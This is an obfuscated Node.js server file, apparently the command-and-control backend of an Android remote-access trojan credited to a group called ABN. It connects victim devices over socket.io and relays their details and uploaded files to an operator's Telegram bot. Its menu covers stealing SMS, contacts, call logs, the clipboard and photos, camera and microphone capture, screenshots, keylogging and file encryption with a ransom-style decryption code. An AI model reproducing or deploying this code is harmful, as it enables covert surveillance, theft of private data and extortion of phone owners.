// server.js
// تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab
// تم انشاء هذا البوت بواسطة منظمة 『ABN』

function _0x36a7(_0x235dc7, _0x192162) {
    const _0x1e1523 = _0x4313();
    return _0x36a7 = function (_0x213856, _0x2f9cb0) {
        _0x213856 = _0x213856 - (0x1 * 0x64b + 0x1c5 * 0xf + -0x1 * 0x1ee3);
        let _0x14626b = _0x1e1523[_0x213856];
        return _0x14626b;
    }, _0x36a7(_0x235dc7, _0x192162);
}
function _0x4313() {
    const _0x44591d = [
        'currentTar',
        'ل جيميل 📧',
        'off',
        'ARnlz',
        'all-sms',
        'HMTET',
        '<b>إصدار ا',
        'MQeYG',
        'ائل 💬',
        'hsPOD',
        'WpXBx',
        'gSIPM',
        'clipboard',
        'ل </b>\x0a\x0a',
        'VSggw',
        'إلى القائم',
        'emit',
        'لشاشة 😎',
        'Helff',
        '✯ حدد اي ا',
        'POWcA',
        '<b>✯ الان ',
        '✯ معلومات ',
        'ة</b>\x0a\x0a',
        'FxUCM',
        '→ </b>',
        'toast',
        'مكنك التحك',
        'contacts',
        '✯ رجوع ✯',
        'FwqNA',
        '|back-0',
        'abEHy',
        'hGhIS',
        'ا يتحمل مس',
        'SgOTN',
        '𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟',
        'model',
        'ي وسهل الا',
        'tppeS',
        'YjyYm',
        'يات المطور',
        'سال الرسال',
        'smsToAllCo',
        'fJklo',
        'CLOLW',
        'playAudio',
        ' الاشعارات',
        'log',
        'pgYMs',
        'KRrbd',
        ' هاتف الضح',
        'twgFo',
        'toastText',
        'ض جميع الم',
        'بنجاح  سوف',
        '341829KdsbiA',
        'RpRKE',
        ' الضحيه ',
        'pyhJJ',
        'مه ',
        'HBeIo',
        'upload',
        'cFJHr',
        'sockets',
        'PORT',
        'ت خبيثه لا',
        '📽 التطبيقا',
        'size',
        'جميع ارقام',
        'onText',
        '✯ تحميل مل',
        'vgQYv',
        'file_id',
        'سية</b>\x0a\x0a',
        'ذي تريد إر',
        'FrrOE',
        'vibrateDur',
        'ح     ...\x0a',
        'HSDwf',
        'صوت 🛑',
        'كم به</b>\x0a',
        'ySPWG',
        'ارقام الضح',
        'Rvhty',
        '📳 اهتزاز 📳',
        '🎬 سحب جميع',
        ' بعد الضغط',
        'Kbmhr',
        '𝚎𝚐𝚛𝚊𝚖 → @',
        'مز الدوله ',
        'RoMMP',
        'message_id',
        'DMvqW',
        'QWKQD',
        'AHGAo',
        'الضحية متتص',
        'ائمة الريي',
        'FTWid',
        '</b>\x0a',
        'bvHyo',
        'oeOUM',
        'ping',
        'currentAct',
        'لاجهزه الم',
        'text',
        '🎙 تسجيل صو',
        'uoIow',
        'gFnRT',
        'u_x86\x0aTelegr',
        'ذا البوت ي',
        'Duration',
        '|request-',
        'OQizW',
        'ه ليس من ب',
        'فيذ الطلب ',
        '✯ التراجع ',
        'express',
        'sendSms',
        'disconnect',
        '<b>✯ ارسل ',
        'wDdEO',
        'ber',
        'ؤولية سو ا',
        'لجهاز اللي',
        'set',
        'qmSqi',
        '𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋',
        ' أندرويد \x0a',
        'ACIIr',
        'oibGt',
        '1324955fXiGLY',
        'pyzeN',
        'هاتف</b> →',
        'BjUhN',
        'حة مزورة ‼',
        'aOTNV',
        'CCUAs',
        '<b>𝚒𝚙</b> ',
        'xAfCt',
        'ملفات ⚠️',
        'lKTya',
        'split',
        'on port 30',
        'url',
        'تحكم ✯',
        's://t.me',
        '<b>العدد ',
        'originalna',
        '▶ تشغيل ال',
        'XjzKl',
        'TuXFO',
        'fzeQJ',
        'يه 💬',
        'ا يغضب الل',
        '𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊',
        'single',
        'createServ',
        '*/*',
        'الشاشة 😎',
        'tuJBK',
        '𝚌𝚘𝚗𝚍𝚜</b>\x0a',
        'yJQuh',
        'kWxdr',
        'فظه 📋',
        'OaeBd',
        'smsText',
        '<b>✯ القائ',
        'لضحيه ',
        'تطويره لاج',
        '</b>\x0a\x0a',
        'من هاتف ال',
        'لاجهزه فبه',
        'tRUQf',
        'ABUif',
        'get',
        'وسهلا في ا',
        'textToAllC',
        'uvVuL',
        'vibrate',
        'ير الملفات',
        ' على اسم ا',
        'readFileSy',
        'https',
        'تي تريد اض',
        '<b>✯ نحن ا',
        '<b>✯ ✯ اكت',
        '157999JWcOzI',
        'HXPAl',
        'sSnbi',
        'ram-bot-ap',
        'PiBez',
        'grDHq',
        'الرقم الذي',
        'buffer',
        '|delete-',
        'حتاج الا ك',
        'ل</b>\x0a\x0a',
        'ختراق الاج',
        'تم تطوير ا',
        'ستخدام لات',
        '>\x0a\x0a',
        'QgDqS',
        'vzbbR',
        'currentNum',
        'voice',
        '📧 سحب رساي',
        'جرا تريد :',
        '\x0a✯ العودة ',
        'اتف</b> → ',
        'hdJEG',
        'makeCallTe',
        'listen',
        'قوى بوت تح',
        'FSmfF',
        'popNotific',
        'BnXZc',
        '<b>✯ تم تن',
        'connection',
        '1653iVPONc',
        'عارات الضح',
        'selfie-cam',
        'qZwQU',
        'صال به</b>',
        'message',
        'uRMLo',
        'بوت رات قو',
        'NCwTW',
        'لرقم معا ر',
        'AeQsn',
        'ي نخترق \x0aن',
        '/upload',
        'Uajlm',
        'rWKOo',
        'الابوايه ف',
        'fwwLa',
        'multer',
        'اكتب الراب',
        'CUwSn',
        'isFolder',
        '<b>✯ الجها',
        'PHOyW',
        'د ضحية متتص',
        '<b>✯ اكتب ',
        'jrcFv',
        ' الملفات 📂',
        '✯ حذف المل',
        'node-teleg',
        'Wctnu',
        'wrQOE',
        'apps',
        'arjOK',
        'ADLUD',
        'ل 🦅🇾🇪 ال',
        'keylogger-',
        'COyLT',
        'مبيوتر لاج',
        'فيذ طلب ال',
        'no informa',
        'هاتف الضحي',
        'fWhNC',
        ' تتلاقى ال',
        'currentNot',
        'http',
        'oSogR',
        'YIyqH',
        'data',
        '|cd-',
        'غيله بهاتف',
        'version',
        'skaWZ',
        'ybnqY',
        '📸 كيمرا خل',
        'screenshot',
        '💬 سحب الرس',
        'push',
        '1800Xkxemb',
        'ضحيه → ',
        '<b>✯ تم عر',
        'KUcGh',
        'socket.io',
        'length',
        'ext',
        'makeCallNu',
        '✯ عدد الاج',
        'duration',
        'ت 🎙',
        'لدك فكتب ا',
        'ي السيبران',
        '',
        'ه @u_x86 ',
        'RSweu',
        'am → http',
        '✯ العودة إ',
        'QQvVe',
        '<b>✯ سجل ا',
        'number',
        'المات 📞',
        'ت 📽',
        'ojySU',
        'امية 📸',
        'صنع برمجيا',
        'KyKEn',
        'تي تريد ار',
        '🛑 ايقاف ال',
        '<b>✯ لايوج',
        'SRsQE',
        'name',
        'تريد بجهاز',
        'VcAKd',
        'عن المطور ',
        'ف ✯',
        'rwzoV',
        'qrxOe',
        ' تريد الات',
        ' الصور 🎬',
        '..\x0a\x0a✯ العو',
        'ontacts',
        '4|3|0|2|1',
        'wcqGN',
        'ucYrA',
        '<b>إصدارال',
        './data.jso',
        '📂 عرض جميع',
        'rUqqo',
        'onUrl',
        'BZAZH',
        'الإصدار 5<',
        '<b>✯ جهاز ',
        'الرساله ال',
        'tGgwm',
        'notificati',
        'StNZR',
        '<b>✯ 𝙴𝚗𝚝𝚎𝚛',
        'RXAGd',
        'jDKdU',
        'NRqAi',
        'جرا اي شي ',
        'hdAIF',
        'mXvJl',
        'ATlEf',
        'ل المطور ل',
        '<b>✯ حدد ا',
        'ية 🦝',
        'tion',
        'SSCYa',
        'TmFrI',
        '<b>✯ تم اس',
        'اله اسفل ا',
        'اله =اسفل ',
        'هارها اسفل',
        'ه اليه اذا',
        'microphone',
        'buRdy',
        'UMoBA',
        ' الملك صقر ',
        '⚠️ تشفير ',
        'klyVw',
        'الملك صقر  تم ',
        'then',
        'qQjHp',
        '/',
        'all-email',
        '📸 كيمرا أم',
        ' اتصال 📒',
        'لتاكيد اجر',
        'headers',
        '10jqzdiS',
        'makeCall',
        'xwfKC',
        'mSeFE',
        'wiYJD',
        '/b>\x0a\x0a',
        'ميل ملف من',
        'n6tkMzNk</b>\x0a\x0a',
        'commend',
        'hDJBw',
        'sendDocume',
        'zjpbR',
        'ة 📺',
        'صوت ▶',
        'لهاتف</b> ',
        '**موافق** ',
        'الرسالة ال',
        'xjphE',
        'م باي هاتف',
        'فيه 📸',
        '/start',
        'BHPlN',
        'Done',
        '<b>الوقت</',
        'BMnON',
        'ntacts',
        '\x0a\x0a𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ',
        'calls',
        'ادم معا تح',
        '🦝 اضهار اش',
        'includes',
        'ل التسليه ',
        'b> → ',
        'تواصل بل ا',
        'send',
        'ation',
        '</b>',
        'اله لجميع ',
        'ارسل كلمه ',
        'paFDf',
        '1751280ZYJvTX',
        'VqrFV',
        'QbQOS',
        ' الرئيسية ',
        'u_x86 ',
        'recordVoic',
        'ل اختراق ا',
        'خدمه فيم',
        'eText',
        'file-explo',
        'editMessag',
        'YHZtD',
        'LuXSV',
        'era',
        'fJCtm',
        'YOXnp',
        'bVUvK',
        'ب الرقم ال',
        'UfVZr',
        'اشعارات 🛑',
        'عن الاجراء',
        'request',
        '<b>✯ عدد ا',
        'main-camer',
        'ملف قريبآ.',
        'لفات لدى ا',
        '𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎',
        'DVFqO',
        'delete',
        'يه → ',
        'CgDcr',
        'bXPZq',
        'CfeUK',
        'rer',
        'WzUaU',
        'dFxqG',
        'لمطور: @',
        '+T_8QE67P',
        'ه☎️',
        'smsNumber',
        'nubEg',
        'تم رفع الخ',
        'handshake',
        'hLifc',
        'uery',
        'kocxE',
        'لبوت من قب',
        'CDNjl',
        'لرابط </b>',
        'ificationT',
        'ة الرئيسية',
        'env',
        ' كان الضحي',
        'utf8',
        'sThJb',
        'listening ',
        'yCtVW',
        'كم بضحايا ',
        'LexPl',
        'KwSVR',
        'RkOYS',
        'اله 💬',
        '<b>اسم اله',
        ' الضحيه</b',
        'WJvpz',
        '<b>✯ تم تح',
        '2lNQqog',
        'ي صوت لاتش',
        'ط الذي تري',
        '💬 ارسال رس',
        'XPwbC',
        'ان تظهر في',
        'qFEHz',
        'سالها الا ',
        '1549712ywIZAN',
        'والراقابه ',
        'MZPUm',
        ' تريد التح',
        'ده ان يظهر',
        'هزه ✯',
        'LMUpv',
        'FahaN',
        'ozvdY',
        '📒 سحب جهات',
        'time',
        '515886tDOIUv',
        'خترقه: ',
        'IwwrQ',
        'مة الرئيسي',
        '📞 سجل المك',
        'هزه, \x0a\x0a𝚃𝚎𝚕',
        'parse',
        'ز غير متصل',
        'لى القائمة',
        '📋 سجل الحا',
        '😎 اضهار رس',
        'تلم رساله ',
        'forEach',
        'اتصال بنجا',
        ' الشاشة</b',
        'تي تريدها ',
        'maoyn',
        'callback_q',
        'HTML',
        '☎️اتصال من ',
        'getFileLin',
        'bUOIn',
        '📺 لقطة شاش',
        'sendMessag',
        'token',
        'mber',
        'اء  المكال',
        '|upload-',
        '✯ قائمة ال',
        'gallery',
        'file',
        'ion',
        'دة إلى الق',
        'sendMe',
        'NstmB',
        'كود فك تشف',
        '<b>✯ اهلآ ',
        'back',
        '‼ اشعار صف',
        'kLiWJ',
        'post',
        'VzNyA',
        'KMcVK',
        ' 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝',
        'لجيش اليمن',
        'ARLCP',
        'vqfuH'
    ];
    _0x4313 = function () {
        return _0x44591d;
    };
    return _0x4313();
}
const _0x286428 = _0x36a7;
(function (_0x1fec23, _0x4de6c9) {
    const _0x6c7bf3 = _0x36a7, _0x330950 = _0x1fec23();
    while (!![]) {
        try {
            const _0x4ff7a1 = parseInt(_0x6c7bf3(0x220)) / (-0x2da * -0xd + 0x598 * 0x6 + -0x9 * 0x7d9) * (parseInt(_0x6c7bf3(0x33f)) / (0x5a9 + 0x173 * 0x15 + -0x2416)) + -parseInt(_0x6c7bf3(0x240)) / (-0x34 * 0x72 + -0x3 * -0xc3 + 0x51 * 0x42) * (-parseInt(_0x6c7bf3(0x279)) / (-0x1a4 * -0xb + 0x13e4 + -0x25ec)) + -parseInt(_0x6c7bf3(0x404)) / (0xa75 * 0x1 + -0x100a * -0x2 + -0x2a84) + -parseInt(_0x6c7bf3(0x2fd)) / (-0x1f19 + -0x3 * -0xc67 + -0x616) + parseInt(_0x6c7bf3(0x352)) / (0x1 * 0xee6 + 0x4 * 0x409 + 0x1 * -0x1f03) + parseInt(_0x6c7bf3(0x347)) / (-0x13ce + -0x2283 + 0x3659) + -parseInt(_0x6c7bf3(0x3b9)) / (0x2613 + -0x4cd * 0x1 + -0x213d) * (-parseInt(_0x6c7bf3(0x2d5)) / (0x1f5c + -0xe5c * 0x1 + 0x1a * -0xa7));
            if (_0x4ff7a1 === _0x4de6c9)
                break;
            else
                _0x330950['push'](_0x330950['shift']());
        } catch (_0x4b781b) {
            _0x330950['push'](_0x330950['shift']());
        }
    }
}(_0x4313, 0x2171b + -0x1 * 0x4a063 + 0x4e4af));
const express = require(_0x286428(0x3f6)), http = require(_0x286428(0x26c)), {Server} = require(_0x286428(0x27d)), telegramBot = require(_0x286428(0x25c) + _0x286428(0x223) + 'i'), https = require(_0x286428(0x21c)), multer = require(_0x286428(0x251)), fs = require('fs'), app = express(), server = http[_0x286428(0x202) + 'er'](app), io = new Server(server), uploader = multer(), data = JSON[_0x286428(0x358)](fs[_0x286428(0x21b) + 'nc'](_0x286428(0x2a7) + 'n', _0x286428(0x332))), bot = new telegramBot(data[_0x286428(0x36a)], { 'polling': !![] }), appData = new Map(), actions = [
        _0x286428(0x350) + _0x286428(0x2d2),
        _0x286428(0x277) + _0x286428(0x389),
        _0x286428(0x356) + _0x286428(0x28e),
        _0x286428(0x3c4) + _0x286428(0x28f),
        _0x286428(0x275) + _0x286428(0x2e8),
        _0x286428(0x2d1) + _0x286428(0x291),
        _0x286428(0x3eb) + _0x286428(0x283),
        _0x286428(0x35b) + _0x286428(0x209),
        _0x286428(0x368) + _0x286428(0x2e1),
        _0x286428(0x35c) + _0x286428(0x2c2) + _0x286428(0x392),
        _0x286428(0x342) + _0x286428(0x33a),
        _0x286428(0x3d6),
        _0x286428(0x1fa) + _0x286428(0x2e2),
        _0x286428(0x295) + _0x286428(0x3d1),
        _0x286428(0x2f2) + _0x286428(0x241) + _0x286428(0x2bc),
        _0x286428(0x295) + _0x286428(0x310),
        _0x286428(0x2a8) + _0x286428(0x25a),
        _0x286428(0x3d7) + _0x286428(0x2a0),
        _0x286428(0x342) + _0x286428(0x2fa) + _0x286428(0x3d4) + _0x286428(0x1fe),
        _0x286428(0x378) + _0x286428(0x408),
        _0x286428(0x233) + _0x286428(0x382),
        _0x286428(0x2ca) + _0x286428(0x40d),
        _0x286428(0x365) + _0x286428(0x268) + _0x286428(0x323),
        _0x286428(0x28a) + _0x286428(0x35a) + _0x286428(0x300) + '✯'
    ];
app[_0x286428(0x214)]('/', (_0x475404, _0x364a1f) => {
    const _0x4afaa0 = _0x286428, _0x30b554 = { 'VqrFV': _0x4afaa0(0x326) + _0x4afaa0(0x2f1) + _0x4afaa0(0x3aa) + _0x4afaa0(0x2c9) + '\n\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』' };
    _0x364a1f[_0x4afaa0(0x2f7)](_0x30b554[_0x4afaa0(0x2fe)]);
}), app[_0x286428(0x37a)](_0x286428(0x24c), uploader[_0x286428(0x201)](_0x286428(0x370)), (_0x504b1c, _0x252371) => {
    const _0x409dce = _0x286428, _0x1e4d80 = {
            'paFDf': _0x409dce(0x364),
            'fJklo': _0x409dce(0x203),
            'CLOLW': _0x409dce(0x2eb)
        }, _0xdb74ab = _0x504b1c[_0x409dce(0x370)][_0x409dce(0x1f9) + 'me'], _0xa03b1b = _0x504b1c[_0x409dce(0x2d4)][_0x409dce(0x3a6)];
    bot[_0x409dce(0x2df) + 'nt'](data['id'], _0x504b1c[_0x409dce(0x370)][_0x409dce(0x227)], {
        'caption': '📁 تم رفع ملف\n👤 من الضحية: ' + _0xa03b1b + '\n📄 اسم الملف: ' + _0xdb74ab + '\n\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
        'parse_mode': _0x1e4d80[_0x409dce(0x2fc)]
    }, {
        'filename': _0xdb74ab,
        'contentType': _0x1e4d80[_0x409dce(0x3ad)]
    }), _0x252371[_0x409dce(0x2f7)](_0x1e4d80[_0x409dce(0x3ae)]);
}), io['on'](_0x286428(0x23f), _0x5c13cb => {
    const _0x34d9e4 = _0x286428, _0x25dd5e = {
            'RkOYS': function (_0x2b56ea, _0x375fa5) {
                return _0x2b56ea + _0x375fa5;
            },
            'VzNyA': function (_0x5a599f, _0x3ed8a6) {
                return _0x5a599f + _0x3ed8a6;
            },
            'KUcGh': function (_0x174881, _0x8e391f) {
                return _0x174881 + _0x8e391f;
            },
            'oeOUM': _0x34d9e4(0x364),
            'BjUhN': function (_0x22c95b, _0x5f52a9) {
                return _0x22c95b === _0x5f52a9;
            },
            'nubEg': function (_0x10f858, _0xd4e67e) {
                return _0x10f858 + _0xd4e67e;
            },
            'PiBez': function (_0x275118, _0x465575) {
                return _0x275118 === _0x465575;
            },
            'WzUaU': _0x34d9e4(0x39e),
            'DVFqO': function (_0x3b1c30, _0x1d2528) {
                return _0x3b1c30 + _0x1d2528;
            },
            'jDKdU': function (_0x366a14, _0x3461c1) {
                return _0x366a14 + _0x3461c1;
            },
            'CUwSn': _0x34d9e4(0x3a6),
            'BnXZc': _0x34d9e4(0x267) + _0x34d9e4(0x2bd) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'Uajlm': _0x34d9e4(0x272),
            'cFJHr': function (_0x45af4c, _0x5ac04d) {
                return _0x45af4c + _0x5ac04d;
            },
            'gSIPM': function (_0x3f9b5e, _0x1337f3) {
                return _0x3f9b5e + _0x1337f3;
            },
            'FSmfF': _0x34d9e4(0x3f8),
            'pyzeN': _0x34d9e4(0x306) + _0x34d9e4(0x31e),
            'skaWZ': _0x34d9e4(0x245)
        };
    let _0x444e7d = _0x25dd5e[_0x34d9e4(0x318)](_0x25dd5e[_0x34d9e4(0x2b4)](_0x5c13cb[_0x34d9e4(0x327)][_0x34d9e4(0x2d4)][_0x25dd5e[_0x34d9e4(0x253)]], '-'), io[_0x34d9e4(0x3c1)][_0x34d9e4(0x3c1)][_0x34d9e4(0x3c5)]) || _0x25dd5e[_0x34d9e4(0x23d)], _0x5d119c = _0x5c13cb[_0x34d9e4(0x327)][_0x34d9e4(0x2d4)][_0x25dd5e[_0x34d9e4(0x24d)]] || _0x25dd5e[_0x34d9e4(0x23d)], _0x76c6b1 = _0x5c13cb[_0x34d9e4(0x327)][_0x34d9e4(0x2d4)]['ip'] || _0x25dd5e[_0x34d9e4(0x23d)];
    _0x5c13cb[_0x25dd5e[_0x34d9e4(0x253)]] = _0x444e7d, _0x5c13cb[_0x25dd5e[_0x34d9e4(0x24d)]] = _0x5d119c;
    let _0x35ea49 = _0x25dd5e[_0x34d9e4(0x3c0)](_0x25dd5e[_0x34d9e4(0x318)](_0x25dd5e[_0x34d9e4(0x38c)](_0x25dd5e[_0x34d9e4(0x37b)](_0x34d9e4(0x2ad) + _0x34d9e4(0x3e1) + _0x34d9e4(0x22a), _0x34d9e4(0x33b) + _0x34d9e4(0x236) + _0x444e7d + '\x0a'), _0x34d9e4(0x2a6) + _0x34d9e4(0x406) + '\x20' + _0x5d119c + '\x0a'), _0x34d9e4(0x40b) + '→\x20' + _0x76c6b1 + '\x0a'), _0x34d9e4(0x2ec) + _0x34d9e4(0x2f5) + _0x5c13cb[_0x34d9e4(0x327)][_0x34d9e4(0x351)] + '\x0a\x0a\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』');
    bot[_0x34d9e4(0x369) + 'e'](data['id'], _0x35ea49, { 'parse_mode': _0x25dd5e[_0x34d9e4(0x3e6)] }), _0x5c13cb['on'](_0x25dd5e[_0x34d9e4(0x23b)], () => {
        const _0x558aec = _0x34d9e4;
        let _0x263547 = _0x25dd5e[_0x558aec(0x339)](_0x25dd5e[_0x558aec(0x339)](_0x25dd5e[_0x558aec(0x37b)](_0x25dd5e[_0x558aec(0x27c)](_0x558aec(0x255) + _0x558aec(0x359) + _0x558aec(0x20f), _0x558aec(0x33b) + _0x558aec(0x236) + _0x444e7d + '\x0a'), _0x558aec(0x387) + _0x558aec(0x2e3) + '→\x20' + _0x5d119c + '\x0a'), _0x558aec(0x40b) + '→\x20' + _0x76c6b1 + '\x0a'), _0x558aec(0x2ec) + _0x558aec(0x2f5) + _0x5c13cb[_0x558aec(0x327)][_0x558aec(0x351)] + '\x0a\x0a\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』');
        bot[_0x558aec(0x369) + 'e'](data['id'], _0x263547, { 'parse_mode': _0x25dd5e[_0x558aec(0x3e6)] });
    }), _0x5c13cb['on'](_0x25dd5e[_0x34d9e4(0x405)], _0x4ccc0c => {
        const _0x5acb82 = _0x34d9e4;
        let _0x520b32 = [], _0x41751b = [];
        _0x4ccc0c[_0x5acb82(0x35e)]((_0x2162d1, _0x2a1b0c) => {
            const _0x3c5d98 = _0x5acb82;
            let _0x5b8386;
            _0x2162d1[_0x3c5d98(0x254)] ? _0x5b8386 = _0x444e7d + _0x3c5d98(0x270) + _0x2162d1[_0x3c5d98(0x298)] : _0x5b8386 = _0x444e7d + _0x3c5d98(0x3f1) + _0x2162d1[_0x3c5d98(0x298)];
            if (_0x25dd5e[_0x3c5d98(0x407)](_0x41751b[_0x3c5d98(0x27e)], 0x5 * 0x7c9 + -0x25b0 + -0x13d) || _0x25dd5e[_0x3c5d98(0x407)](_0x41751b[_0x3c5d98(0x27e)], -0x1b31 * -0x1 + 0x2b * -0x3b + 0x1 * -0x1147))
                _0x41751b[_0x3c5d98(0x278)]({
                    'text': _0x2162d1[_0x3c5d98(0x298)],
                    'callback_data': _0x5b8386
                }), _0x25dd5e[_0x3c5d98(0x407)](_0x25dd5e[_0x3c5d98(0x325)](_0x2a1b0c, -0x1 * -0x1d9 + 0x1d26 + -0x1efe), _0x4ccc0c[_0x3c5d98(0x27e)]) && _0x520b32[_0x3c5d98(0x278)](_0x41751b);
            else
                _0x25dd5e[_0x3c5d98(0x224)](_0x41751b[_0x3c5d98(0x27e)], -0x2611 + -0x869 + -0x11 * -0x2bc) && (_0x41751b[_0x3c5d98(0x278)]({
                    'text': _0x2162d1[_0x3c5d98(0x298)],
                    'callback_data': _0x5b8386
                }), _0x520b32[_0x3c5d98(0x278)](_0x41751b), _0x41751b = []);
        }), _0x520b32[_0x5acb82(0x278)]([{
                'text': _0x25dd5e[_0x5acb82(0x31f)],
                'callback_data': _0x444e7d + _0x5acb82(0x3a0)
            }]), bot[_0x5acb82(0x369) + 'e'](data['id'], _0x5acb82(0x27b) + _0x5acb82(0x3b7) + _0x5acb82(0x316) + _0x5acb82(0x20d) + _0x444e7d + _0x5acb82(0x2f9) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', {
            'reply_markup': { 'inline_keyboard': _0x520b32 },
            'parse_mode': _0x25dd5e[_0x5acb82(0x3e6)]
        });
    }), _0x5c13cb['on'](_0x25dd5e[_0x34d9e4(0x273)], _0xfa321a => {
        const _0x52074a = _0x34d9e4;
        bot[_0x52074a(0x369) + 'e'](data['id'], _0x52074a(0x2c1) + _0x52074a(0x35d) + _0x52074a(0x210) + _0x52074a(0x27a) + _0x444e7d + (_0x52074a(0x2ef) + _0x52074a(0x39a)) + _0xfa321a + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』', { 'parse_mode': _0x25dd5e[_0x52074a(0x3e6)] });
    });
}), bot['on'](_0x286428(0x245), _0x517bec => {
    const _0x5e45b8 = _0x286428, _0x39eaaf = {
            'qrxOe': function (_0x1d7bfc, _0x3f4f84) {
                return _0x1d7bfc + _0x3f4f84;
            },
            'tuJBK': function (_0xa8f676, _0x21e02b) {
                return _0xa8f676 + _0x21e02b;
            },
            'UMoBA': function (_0x455e6f, _0x312299) {
                return _0x455e6f === _0x312299;
            },
            'bVUvK': _0x5e45b8(0x381) + _0x5e45b8(0x214),
            'ATlEf': _0x5e45b8(0x364),
            'wiYJD': _0x5e45b8(0x350) + _0x5e45b8(0x2d2),
            'TmFrI': _0x5e45b8(0x277) + _0x5e45b8(0x389),
            'BMnON': _0x5e45b8(0x356) + _0x5e45b8(0x28e),
            'BZAZH': _0x5e45b8(0x3c4) + _0x5e45b8(0x28f),
            'ozvdY': _0x5e45b8(0x275) + _0x5e45b8(0x2e8),
            'LuXSV': _0x5e45b8(0x2d1) + _0x5e45b8(0x291),
            'StNZR': _0x5e45b8(0x3eb) + _0x5e45b8(0x283),
            'pgYMs': _0x5e45b8(0x35b) + _0x5e45b8(0x209),
            'UfVZr': _0x5e45b8(0x368) + _0x5e45b8(0x2e1),
            'ABUif': _0x5e45b8(0x35c) + _0x5e45b8(0x2c2) + _0x5e45b8(0x392),
            'jrcFv': _0x5e45b8(0x342) + _0x5e45b8(0x33a),
            'wDdEO': _0x5e45b8(0x3d6),
            'kWxdr': _0x5e45b8(0x1fa) + _0x5e45b8(0x2e2),
            'buRdy': _0x5e45b8(0x295) + _0x5e45b8(0x3d1),
            'mXvJl': _0x5e45b8(0x2f2) + _0x5e45b8(0x241) + _0x5e45b8(0x2bc),
            'vzbbR': _0x5e45b8(0x295) + _0x5e45b8(0x310),
            'ucYrA': _0x5e45b8(0x2a8) + _0x5e45b8(0x25a),
            'NstmB': _0x5e45b8(0x3d7) + _0x5e45b8(0x2a0),
            'SgOTN': _0x5e45b8(0x342) + _0x5e45b8(0x2fa) + _0x5e45b8(0x3d4) + _0x5e45b8(0x1fe),
            'POWcA': _0x5e45b8(0x378) + _0x5e45b8(0x408),
            'CgDcr': _0x5e45b8(0x233) + _0x5e45b8(0x382),
            'HSDwf': _0x5e45b8(0x2ca) + _0x5e45b8(0x40d),
            'Helff': _0x5e45b8(0x365) + _0x5e45b8(0x268) + _0x5e45b8(0x323),
            'grDHq': _0x5e45b8(0x28a) + _0x5e45b8(0x35a) + _0x5e45b8(0x300) + '✯',
            'uoIow': function (_0x49334b, _0x59dd87) {
                return _0x49334b === _0x59dd87;
            },
            'oSogR': _0x5e45b8(0x2e9),
            'kocxE': _0x5e45b8(0x376) + _0x5e45b8(0x215) + _0x5e45b8(0x23a) + _0x5e45b8(0x336) + _0x5e45b8(0x2ac) + _0x5e45b8(0x2da) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'FHnkh': _0x5e45b8(0x247) + _0x5e45b8(0x3a7) + _0x5e45b8(0x22d) + _0x5e45b8(0x229) + _0x5e45b8(0x265) + _0x5e45b8(0x303) + _0x5e45b8(0x211) + _0x5e45b8(0x3ef) + _0x5e45b8(0x39c) + _0x5e45b8(0x2e7) + _0x5e45b8(0x401) + _0x5e45b8(0x22c) + _0x5e45b8(0x32b) + _0x5e45b8(0x262) + _0x5e45b8(0x2cc) + _0x5e45b8(0x20e) + _0x5e45b8(0x2f4) + _0x5e45b8(0x348) + _0x5e45b8(0x24f) + _0x5e45b8(0x2ba) + _0x5e45b8(0x3a3) + _0x5e45b8(0x3fc) + _0x5e45b8(0x304) + _0x5e45b8(0x1ff) + _0x5e45b8(0x287) + '\x0a\x0a\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'OaeBd': _0x5e45b8(0x2f6) + _0x5e45b8(0x321) + _0x5e45b8(0x301),
            'abEHy': _0x5e45b8(0x281) + _0x5e45b8(0x34c),
            'FTWid': _0x5e45b8(0x36e) + _0x5e45b8(0x1f6),
            'KMcVK': _0x5e45b8(0x397) + _0x5e45b8(0x29b) + '✯',
            'YOXnp': function (_0x49bf19, _0x209f58) {
                return _0x49bf19 === _0x209f58;
            },
            'AHGAo': _0x5e45b8(0x3e8) + _0x5e45b8(0x371),
            'qZwQU': _0x5e45b8(0x2c6) + _0x5e45b8(0x3f0),
            'qFEHz': _0x5e45b8(0x2dd),
            'QbQOS': _0x5e45b8(0x2c6),
            'tppeS': _0x5e45b8(0x282),
            'XPwbC': _0x5e45b8(0x23e) + _0x5e45b8(0x3f4) + _0x5e45b8(0x3b8) + _0x5e45b8(0x26a) + _0x5e45b8(0x315) + _0x5e45b8(0x2a1) + _0x5e45b8(0x372) + _0x5e45b8(0x3e2) + _0x5e45b8(0x3cb) + '\n👨‍💻 تم تطوير هذا البوت من قبل قائد 『ABN』 @Aosab\n🏢 تم انشاء هذا البوت بواسطة منظمة 『ABN』',
            'QWKQD': _0x5e45b8(0x3b6),
            'qQjHp': _0x5e45b8(0x39b),
            'wrQOE': _0x5e45b8(0x3ea),
            'VSggw': _0x5e45b8(0x280) + _0x5e45b8(0x36b),
            'rwzoV': _0x5e45b8(0x231) + _0x5e45b8(0x3fb),
            'NRqAi': _0x5e45b8(0x238) + 'xt',
